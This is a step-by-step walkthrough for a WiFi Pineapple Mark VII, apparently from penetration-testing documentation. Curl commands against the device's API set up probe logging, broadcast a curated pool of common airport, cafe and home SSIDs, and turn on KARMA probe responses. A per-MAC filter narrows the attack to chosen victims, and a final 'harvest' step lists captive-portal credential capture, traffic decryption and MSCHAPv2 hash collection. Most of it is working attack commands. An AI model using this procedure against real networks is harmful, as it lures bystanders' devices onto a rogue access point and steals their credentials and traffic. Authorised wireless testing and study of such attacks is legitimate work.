# PineAP — walkthrough

A 15-minute engagement. Broadcast a curated SSID pool, log every probe
seen, generate a target list from what associated. This is the passive
recon path; active KARMA is one toggle away.

## Preconditions

- Pineapple Mk VII, up-to-date firmware (>= 3.0).
- Root SSH access or an API token in scope `pineap.write`.
- Optional: a curated SSID pool file (see below).

## Step 1 — Baseline settings

```
# via API
curl -sk https://172.16.42.1:1471/api/pineap/settings \
  -H "Authorization: Bearer $TOKEN" | jq
```

Look for the current values of `karma`, `log_probes`, `beacon_response`,
`broadcast_ssid_pool`, and `ssid_pool[]`.

## Step 2 — Enable passive probe logging first

Least-invasive posture. Just listen.

```
curl -sk -X POST https://172.16.42.1:1471/api/pineap/settings \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "karma": 0,
    "log_probes": 1,
    "beacon_response": 0,
    "broadcast_ssid_pool": 0
  }'
```

Wait 5–10 minutes. Then read the probe log:

```
curl -sk https://172.16.42.1:1471/api/pineap/probes \
  -H "Authorization: Bearer $TOKEN" | jq
```

Each row: probing STA MAC, requested SSID, timestamp.

## Step 3 — Broadcast a curated SSID pool

Populate `ssid_pool` with common home / airport / cafe SSIDs:

```
POOL=$(jq -Rn '["attwifi","xfinitywifi","GoogleGuest","Starbucks WiFi",
                "Boingo Hotspot","Delta Sky Club","Verizon-MiFi",
                "hhonors","Guest","Home","NETGEAR","linksys"]')

curl -sk -X POST https://172.16.42.1:1471/api/pineap/ssid_pool \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{ \"ssids\": $POOL }"

curl -sk -X POST https://172.16.42.1:1471/api/pineap/settings \
  -H "Authorization: Bearer $TOKEN" \
  -d '{ "broadcast_ssid_pool": 1, "beacon_response": 1 }'
```

Now the Pineapple beacons each of those SSIDs on rotation. Clients
that had them in their preferred-network list may associate.

## Step 4 — Enable karma (active probe response)

```
curl -sk -X POST https://172.16.42.1:1471/api/pineap/settings \
  -H "Authorization: Bearer $TOKEN" \
  -d '{ "karma": 1 }'
```

Now the Pineapple probe-responds to every probe request it hears —
regardless of whether the SSID is in the pool. This is the loudest
mode; most WIDS instantly flag "impossible AP" (an AP that responds
positively to every SSID).

## Step 5 — Filter to targets

Once you know which STAs are in scope, gate probe response to just
them:

```
curl -sk -X POST https://172.16.42.1:1471/api/pineap/filter/clients \
  -H "Authorization: Bearer $TOKEN" \
  -d '{ "mode": "allow", "macs": ["aa:bb:cc:dd:ee:ff"] }'
```

The Pineapple ignores probes from anyone not on the allowlist.

## Step 6 — Harvest

Associated clients' traffic transits the Pineapple. From here:

- **Open pool** (no wpa=) → captive portal cred capture.
- **WPA2-PSK pool** (with a known PSK) → traffic decrypt.
- **WPA2-Enterprise pool** → hostapd-wpe on the backend for
  MSCHAPv2 harvest.

## Mapping to KARMA-family attacks

| toggle set                                            | attack record                    |
| ----------------------------------------------------- | -------------------------------- |
| `karma=1, beacon_response=1`                          | `pineap-active-karma` / `mana-karma` |
| `broadcast_ssid_pool=1, ssid_pool=<curated>`          | `pineap-ssid-pool-broadcast` / `mana-known-beacons` |
| `karma=1, broadcast_ssid_pool=1, ssid_pool=<all seen>`| `mana-loud`                      |
| `log_probes=1` only                                   | `pineap-passive-probe-log`       |

## Failure modes

- **No probes logged.** Radio B (wlan1) not in monitor. Check via SSH:
  `iw dev wlan1 info` should show `type monitor`.
- **Karma responds but no client associates.** Modern OSes (iOS 14+,
  Android 12+) rarely probe for known networks; per-SSID randomization
  and passive discovery dominate. Add Known Beacons (Step 3) or
  target discoverable OSes.
- **WIDS trips.** Karma mode is loud. Use Known Beacons alone if you
  want a quieter posture.

## Cite

- Hak5 WiFi Pineapple Mark VII API documentation.
- SensePost 2014 — MANA.
- Etizaz Mohsin / Bastille Networks 2017–2018 — Known Beacons.
- attacks.json: `pineap-passive-probe-log`, `pineap-active-karma`,
  `pineap-ssid-pool-broadcast`, `mana-karma`, `mana-known-beacons`,
  `mana-loud`.
